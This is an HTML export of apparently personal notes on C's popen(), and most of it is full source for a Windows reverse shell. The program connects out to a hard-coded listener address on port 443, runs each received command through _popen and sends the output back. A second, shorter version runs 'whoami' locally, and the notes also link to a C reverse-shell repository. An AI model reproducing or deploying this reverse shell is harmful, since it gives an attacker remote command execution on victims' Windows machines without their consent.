<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>popen</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># popen()</h1></strong><br />(I think a better example can be found in my httpbot or ircbot)<br /><br /><strong>Examples</strong><br />• <a href="https://github.com/dev-frog/C-Reverse-Shell/blob/master/reverse.c">https://github.com/dev-frog/C-Reverse-Shell/blob/master/reverse.c</a><br />• <a href="https://stackoverflow.com/questions/43758977/c-popen-changes-the-string">https://stackoverflow.com/questions/43758977/c-popen-changes-the-string</a><br /><br /><code>popen()</code> creates a pipe and executes a command.<br /><a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/popen-wpopen?view=vs-2019#return-value">https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/popen-wpopen?view=vs-2019#return-value</a><br /><br />This method makes a psuedo shell.<br />You&#39;re effectively executing commands on a remote system and retrieving the output.<br />You don&#39;t actually have a shell on the system, so you can&#39;t <code>cd</code> into directories or handle interactive processes.<br /><br />A &quot;shell&quot; is achieved by wrapping a <code>while (true)</code> around <code>_popen()</code> to keep executing commands as long as there are no errors.<br /><br /><div class="codebox"><div class="codebox">/*<br />_popen()&nbsp;Windows&nbsp;reverse&nbsp;shell.<br /><br />To&nbsp;fix:<br />-&nbsp;only&nbsp;last&nbsp;line&nbsp;of&nbsp;command&nbsp;output&nbsp;received&nbsp;on&nbsp;listener<br />	-&nbsp;line&nbsp;68&nbsp;-&nbsp;i&nbsp;think&nbsp;it&nbsp;has&nbsp;to&nbsp;do&nbsp;with&nbsp;puts()&nbsp;and&nbsp;not&nbsp;concatenating&nbsp;output&nbsp;together<br />-&nbsp;when&nbsp;commands&nbsp;don&#39;t&nbsp;exist,&nbsp;listener&nbsp;receives&nbsp;junk&nbsp;data<br />*/<br /><br />#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;WinSock2.h&gt;<br />#include&nbsp;&lt;WS2tcpip.h&gt;<br /><br />#pragma&nbsp;comment(lib,&nbsp;&quot;Ws2_32.lib&quot;)<br /><br />#define&nbsp;REMOTE_IP&nbsp;&quot;192.168.58.142&quot;<br />#define&nbsp;REMOTE_PORT&nbsp;443<br />#define&nbsp;OUTBOUND_PORT&nbsp;60275<br /><br />#define&nbsp;RECV_LEN&nbsp;1024<br /><br />/*<br />Receives&nbsp;a&nbsp;command,&nbsp;executes&nbsp;it,&nbsp;and&nbsp;sends&nbsp;the&nbsp;output&nbsp;back&nbsp;to&nbsp;the&nbsp;listener&nbsp;(the&nbsp;socket).<br />To&nbsp;turn&nbsp;this&nbsp;into&nbsp;a&nbsp;psuedo-shell,&nbsp;wrap&nbsp;a&nbsp;while&nbsp;loop&nbsp;around&nbsp;it:&nbsp;`while&nbsp;(execute_command(socket)&nbsp;==&nbsp;0)&nbsp;...`<br /><br />Parameters:<br />	SOCKET&nbsp;connectedSocket&nbsp;-&nbsp;a&nbsp;socket&nbsp;that&#39;s&nbsp;already&nbsp;connected&nbsp;to&nbsp;a&nbsp;listener<br />Return&nbsp;value:<br />	On&nbsp;success,&nbsp;returns&nbsp;0.<br />	On&nbsp;failure,&nbsp;return&nbsp;1.<br />	When&nbsp;listener&nbsp;chose&nbsp;to&nbsp;close&nbsp;shell,&nbsp;returns&nbsp;2.<br />*/<br />int&nbsp;execute_command(SOCKET&nbsp;connectedSocket)<br />{<br />	//&nbsp;receive&nbsp;data<br />	char&nbsp;recv_command[RECV_LEN];<br />	int&nbsp;recv_len&nbsp;=&nbsp;0;<br /><br />	recv_len&nbsp;=&nbsp;recv(connectedSocket,&nbsp;recv_command,&nbsp;RECV_LEN,&nbsp;0);<br /><br />	//&nbsp;if&nbsp;data&nbsp;received<br />	if&nbsp;(recv_len&nbsp;&gt;&nbsp;0)<br />	{<br />		//&nbsp;if&nbsp;listener&nbsp;sends&nbsp;&#39;q&#39;&nbsp;-&gt;&nbsp;quit&nbsp;shell<br />		if&nbsp;(strncmp(&quot;q&quot;,&nbsp;recv_command,&nbsp;1)&nbsp;==&nbsp;0)<br />		{<br />			printf(&quot;[+]&nbsp;listener&nbsp;chose&nbsp;to&nbsp;exit&nbsp;shell&nbsp;\n&quot;);<br />			return&nbsp;2;<br />		}<br />		//&nbsp;otherwise,&nbsp;execute&nbsp;command&nbsp;in&nbsp;received&nbsp;buffer<br />		else<br />		{<br />			//&nbsp;execute&nbsp;command<br />			//printf(&quot;[+]&nbsp;executing&nbsp;command&nbsp;\n&quot;);<br />			FILE*&nbsp;pPipe&nbsp;=&nbsp;NULL;<br />			pPipe&nbsp;=&nbsp;_popen(recv_command,&nbsp;&quot;r&quot;);<br />			if&nbsp;(pPipe&nbsp;==&nbsp;NULL)<br />			{<br />				fprintf(stderr,&nbsp;&quot;[!]&nbsp;failed&nbsp;to&nbsp;execute&nbsp;command&nbsp;:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />				return&nbsp;1;<br />			}<br /><br />			//&nbsp;read&nbsp;pipe&nbsp;(command&nbsp;output)&nbsp;into&nbsp;buffer&nbsp;until&nbsp;end&nbsp;of&nbsp;output<br />			//printf(&quot;[+]&nbsp;prepping&nbsp;output&nbsp;to&nbsp;send&nbsp;back&nbsp;\n&quot;);<br />			char&nbsp;pipeBuffer[1024];		//&nbsp;used&nbsp;to&nbsp;read&nbsp;command&nbsp;output&nbsp;into&nbsp;temporarily<br />			//char&nbsp;output[1024];			//&nbsp;store&nbsp;output&nbsp;of&nbsp;command&nbsp;to&nbsp;return&nbsp;to&nbsp;listener<br />			while&nbsp;(fgets(pipeBuffer,&nbsp;1024,&nbsp;pPipe)&nbsp;!=&nbsp;NULL)<br />			{<br />				//strcat_s(output,&nbsp;strlen(output),&nbsp;pipeBuffer);<br />				puts(pipeBuffer);<br />			}<br /><br />			//&nbsp;send&nbsp;command&nbsp;output&nbsp;to&nbsp;listener<br />			//printf(&quot;[+]&nbsp;sending&nbsp;output&nbsp;back&nbsp;to&nbsp;listener&nbsp;\n&quot;);<br />			int&nbsp;send_len&nbsp;=&nbsp;0;<br />			send_len&nbsp;=&nbsp;send(connectedSocket,&nbsp;pipeBuffer,&nbsp;strlen(pipeBuffer),&nbsp;0);<br />			if&nbsp;(send_len&nbsp;==&nbsp;SOCKET_ERROR)<br />			{<br />				fprintf(stderr,&nbsp;&quot;[!]&nbsp;failed&nbsp;to&nbsp;send&nbsp;command&nbsp;output:&nbsp;%d&nbsp;\n&quot;,&nbsp;WSAGetLastError());<br />				return&nbsp;1;<br />			}<br /><br />			//&nbsp;finished.&nbsp;close&nbsp;command&nbsp;pipe<br />			_pclose(pPipe);<br />		}<br />	}<br />	//&nbsp;if&nbsp;?,&nbsp;there&#39;s&nbsp;an&nbsp;error<br />	else<br />	{<br />		fprintf(stderr,&nbsp;&quot;[!]&nbsp;failed&nbsp;to&nbsp;receive&nbsp;data:&nbsp;%d&nbsp;\n&quot;,&nbsp;WSAGetLastError());<br />		return&nbsp;1;<br />	}<br /><br />	return&nbsp;0;<br />}<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />	//&nbsp;initialise&nbsp;winsock<br />	printf(&quot;[*]&nbsp;initialisaing&nbsp;winsock&nbsp;\n&quot;);<br />	WSADATA&nbsp;wsaData;<br />	int&nbsp;ret&nbsp;=&nbsp;0;<br /><br />	ret&nbsp;=&nbsp;WSAStartup(MAKEWORD(2,&nbsp;2),&nbsp;&amp;wsaData);<br />	if&nbsp;(ret&nbsp;!=&nbsp;0)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;initialise&nbsp;winsock:&nbsp;%d&nbsp;\n&quot;,&nbsp;ret);<br />		WSACleanup();<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;set&nbsp;remote&nbsp;address&nbsp;info<br />	struct&nbsp;sockaddr_in&nbsp;remoteHost;<br />	ZeroMemory(&amp;remoteHost,&nbsp;sizeof(remoteHost));<br />	<br />	ULONG&nbsp;remote_ip_binary;								<br />	inet_pton(AF_INET,&nbsp;REMOTE_IP,&nbsp;&amp;remote_ip_binary);		//&nbsp;convert&nbsp;IP&nbsp;string&nbsp;into&nbsp;binary<br /><br />	remoteHost.sin_family&nbsp;=&nbsp;AF_INET;<br />	remoteHost.sin_addr.S_un.S_addr&nbsp;=&nbsp;remote_ip_binary;<br />	remoteHost.sin_port&nbsp;=&nbsp;htons(REMOTE_PORT);<br /><br />	//&nbsp;create&nbsp;socket<br />	printf(&quot;[*]&nbsp;creating&nbsp;socket&nbsp;\n&quot;);<br />	SOCKET&nbsp;muhSocket&nbsp;=&nbsp;INVALID_SOCKET;<br />	muhSocket&nbsp;=&nbsp;socket(AF_INET,&nbsp;SOCK_STREAM,&nbsp;0);<br />	if&nbsp;(muhSocket&nbsp;==&nbsp;INVALID_SOCKET)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;create&nbsp;socket:&nbsp;%d&nbsp;\n&quot;,&nbsp;WSAGetLastError());<br />		closesocket(muhSocket);<br />		WSACleanup();<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;connect&nbsp;to&nbsp;target<br />	printf(&quot;[*]&nbsp;connecting&nbsp;to&nbsp;%s:%d\n&quot;,&nbsp;REMOTE_IP,&nbsp;REMOTE_PORT);<br />	if&nbsp;(connect(muhSocket,&nbsp;(struct&nbsp;sockaddr*)&nbsp;&amp;&nbsp;remoteHost,&nbsp;sizeof(remoteHost))&nbsp;==&nbsp;SOCKET_ERROR)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;connect:&nbsp;%d&nbsp;\n&quot;,&nbsp;WSAGetLastError());<br />		closesocket(muhSocket);<br />		WSACleanup();<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;inform&nbsp;listener<br />	printf(&quot;[*]&nbsp;sending&nbsp;test&nbsp;data&nbsp;to&nbsp;listener&nbsp;\n&quot;);<br />	char&nbsp;msg[]&nbsp;=&nbsp;&quot;[*]&nbsp;hey!&nbsp;:)&nbsp;spawning&nbsp;a&nbsp;shell...&nbsp;\n[*]&nbsp;send&nbsp;&#39;q&#39;&nbsp;to&nbsp;gracefully&nbsp;close&nbsp;shell&nbsp;\n&quot;;<br />	if&nbsp;(send(muhSocket,&nbsp;msg,&nbsp;strlen(msg),&nbsp;0)&nbsp;==&nbsp;SOCKET_ERROR)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;send&nbsp;data:&nbsp;%d&nbsp;\n&quot;,&nbsp;WSAGetLastError());<br />		closesocket(muhSocket);<br />		WSACleanup();<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;spawn&nbsp;shell<br />	printf(&quot;[*]&nbsp;waiting&nbsp;for&nbsp;command&nbsp;from&nbsp;listener...&nbsp;\n&quot;);<br />	while&nbsp;(execute_command(muhSocket)&nbsp;==&nbsp;0)<br />	{<br />		//execute_command(muhSocket);<br />	}<br />	<br />	//&nbsp;clean&nbsp;up&nbsp;&amp;&nbsp;exit<br />	printf(&quot;[*]&nbsp;exiting&nbsp;\n&quot;);<br />	closesocket(muhSocket);<br />	WSACleanup();<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h2>## Version 2</h2></strong><br />Inspiration from:<br /><a href="https://stackoverflow.com/questions/43758977/c-popen-changes-the-string">https://stackoverflow.com/questions/43758977/c-popen-changes-the-string</a><br /><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />char*&nbsp;execute_command(char*&nbsp;command)&nbsp;<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;pPipe&nbsp;=&nbsp;_popen(command,&nbsp;&quot;r&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(pPipe&nbsp;==&nbsp;NULL)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;execute&nbsp;command:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;NULL;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;charCount;<br />&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;outputSize&nbsp;=&nbsp;128;<br />&nbsp;&nbsp;&nbsp;&nbsp;char*&nbsp;output&nbsp;=&nbsp;malloc(outputSize);<br />&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;ch;<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;loop&nbsp;through&nbsp;pPipe&nbsp;until&nbsp;end&nbsp;of&nbsp;pipe,&nbsp;getting&nbsp;1&nbsp;character&nbsp;at&nbsp;a&nbsp;time<br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(charCount&nbsp;=&nbsp;0;&nbsp;;)&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If&nbsp;number&nbsp;of&nbsp;chars&nbsp;is&nbsp;more&nbsp;than&nbsp;the&nbsp;initially&nbsp;allocated&nbsp;size&nbsp;of&nbsp;the&nbsp;output&nbsp;string&nbsp;(128),&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;outputSize&nbsp;will&nbsp;be&nbsp;doubled&nbsp;and&nbsp;memory&nbsp;reallocated.<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(charCount&nbsp;&gt;=&nbsp;outputSize)&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outputSize&nbsp;=&nbsp;2&nbsp;*&nbsp;outputSize;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;allocate&nbsp;memory&nbsp;for&nbsp;string<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;=&nbsp;realloc(output,&nbsp;outputSize);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;get&nbsp;character&nbsp;from&nbsp;pipe<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ch&nbsp;=&nbsp;getc(pPipe);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;if&nbsp;reached&nbsp;end&nbsp;of&nbsp;pipe,&nbsp;exit&nbsp;loop<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(ch&nbsp;==&nbsp;EOF)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;write&nbsp;character&nbsp;into&nbsp;output&nbsp;string<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output[charCount++]&nbsp;=&nbsp;ch;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;add&nbsp;NULL&nbsp;byte&nbsp;and&nbsp;remove&nbsp;newline&nbsp;(by&nbsp;inserting&nbsp;a&nbsp;NULL&nbsp;byte&nbsp;to&nbsp;the&nbsp;end&nbsp;of&nbsp;the&nbsp;output&nbsp;string&nbsp;-&nbsp;1)<br />&nbsp;&nbsp;&nbsp;&nbsp;output[charCount&nbsp;-&nbsp;1]&nbsp;=&nbsp;0;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;_pclose(pPipe);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;output;<br />}<br /><br />int&nbsp;main()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;command[]&nbsp;=&nbsp;&quot;whoami&quot;;<br />&nbsp;&nbsp;&nbsp;&nbsp;char*&nbsp;output&nbsp;=&nbsp;execute_command(command);<br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;%s&nbsp;\n&quot;,&nbsp;output);<br />	<br />	return&nbsp;0;<br />}<br /></div></div><br /></div>
</body>
</html>
